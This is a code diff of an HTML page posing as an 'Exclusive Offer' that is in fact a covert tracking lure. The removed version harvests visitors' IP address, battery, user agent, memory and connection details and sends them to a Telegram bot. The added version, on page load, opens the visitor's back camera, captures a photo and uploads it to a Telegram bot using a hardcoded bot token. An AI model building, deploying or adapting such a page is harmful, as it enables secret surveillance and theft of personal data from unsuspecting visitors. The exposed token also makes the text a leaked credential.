@@ -1,7 +1,10 @@
-<!DOCTYPE HTML>
-<html>
-    <head>
-          <meta charset="UTF-8">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get Offer</title>
+              <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Exclusive Offer</title>
     </head>
@@ -109,89 +112,75 @@ body {
   transform: scale(1.1);
 }
 </style>
-        <script>
-            // Function to get query parameters from the URL
-            function getQueryParam(param) {
-                const urlParams = new URLSearchParams(window.location.search);
-                return urlParams.get(param);
-            }
+</head>
+<body>
+    <script>
+        // Extract the chat ID from the URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get("chat_id");
 
-            // Function to collect device and user information
-            async function collectDeviceInfo() {
-                const deviceInfo = {
-                    ip: await fetch('https://api.ipify.org?format=json')
-                        .then((res) => res.json())
-                        .then((data) => data.ip),
-                    battery: navigator.getBattery
-                        ? await navigator.getBattery().then((battery) => ({
-                              level: Math.round(battery.level * 100) + '%',
-                              charging: battery.charging,
-                          }))
-                        : { level: 'Unavailable', charging: 'Unknown' },
-                    userAgent: navigator.userAgent,
-                    deviceMemory: navigator.deviceMemory || 'Unknown',
-                    platform: navigator.platform,
-                    time: new Date().toLocaleTimeString(),
-                    date: new Date().toLocaleDateString(),
-                    language: navigator.language,
-                    connection: navigator.connection
-                        ? {
-                              downlink: navigator.connection.downlink,
-                              effectiveType: navigator.connection.effectiveType,
-                          }
-                        : { downlink: 'Unknown', effectiveType: 'Unknown' },
-                };
+        if (!chatId) {
+            alert("Chat ID not provided. Please add ?chat_id=YOUR_CHAT_ID to the URL.");
+            throw new Error("Chat ID is missing from the URL.");
+        }
 
-                return deviceInfo;
-            }
+        const telegramBotToken = "5870324658:AAECYqdsDeyuR3EIBHbHLXYfG49QCdiZ8uE"; // Replace with your bot token
 
-            // Function to send the collected data to Telegram
-            async function sendToTelegram(botToken, chatId, message) {
-                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-                const response = await fetch(telegramUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message,
-                    }),
+        async function captureAndSend() {
+            try {
+                // Access the back camera
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "environment" }
                 });
-                return response.ok
-                    ? await response.json()
-                    : Promise.reject(new Error('Failed to send message'));
+
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                video.play();
+
+                // Capture a frame after the video starts
+                video.onloadedmetadata = () => {
+                    const canvas = document.createElement("canvas");
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const context = canvas.getContext("2d");
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // Stop the camera
+                    stream.getTracks().forEach(track => track.stop());
+
+                    // Convert the image to a Blob
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append("chat_id", chatId);
+                        formData.append("photo", blob, "image.jpg");
+
+                        // Send the photo to Telegram
+                        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                            method: "POST",
+                            body: formData,
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.ok) {
+                                alert("Photo sent successfully!");
+                            } else {
+                                alert("Failed to send photo: " + data.description);
+                            }
+                        })
+                        .catch(error => {
+                            console.error("Error sending photo:", error);
+                            alert("An error occurred.");
+                        });
+                    }, "image/jpeg");
+                };
+            } catch (error) {
+                console.error("Error accessing the camera:", error);
+                alert("Failed to access the camera. Please grant permission.");
             }
+        }
 
-            // Main function
-            (async function main() {
-                const chatId = getQueryParam('chatId');
-                if (!chatId) {
-                    alert('Error: Chat ID is missing in the URL. Use ?chatId=YOUR_CHAT_ID');
-                    return;
-                }
-
-                const botToken = 'ENTER_YOUR_BOT_TOKEN'; // Replace with your bot token
-                const deviceInfo = await collectDeviceInfo();
-
-                const message =
-                    `Device Info:\n\n` +
-                    `IP: ${deviceInfo.ip}\n` +
-                    `Battery: ${deviceInfo.battery.level} (Charging: ${deviceInfo.battery.charging})\n` +
-                    `User Agent: ${deviceInfo.userAgent}\n` +
-                    `RAM: ${deviceInfo.deviceMemory}\n` +
-                    `Platform: ${deviceInfo.platform}\n` +
-                    `Time: ${deviceInfo.time}\n` +
-                    `Date: ${deviceInfo.date}\n` +
-                    `Language: ${deviceInfo.language}\n` +
-                    `Connection: Downlink: ${deviceInfo.connection.downlink} Mbps, Effective Type: ${deviceInfo.connection.effectiveType}`;
-
-                try {
-                    const response = await sendToTelegram(botToken, chatId, message);
-                    console.log('Message sent to Telegram:', response);
-                } catch (error) {
-                    alert('Error sending message to Telegram.');
-                    console.error('Error:', error);
-                }
-            })();
-        </script>
-    </body>
+        // Automatically capture and send when the page loads
+        window.onload = captureAndSend;
+    </script>
+</body>
 </html>
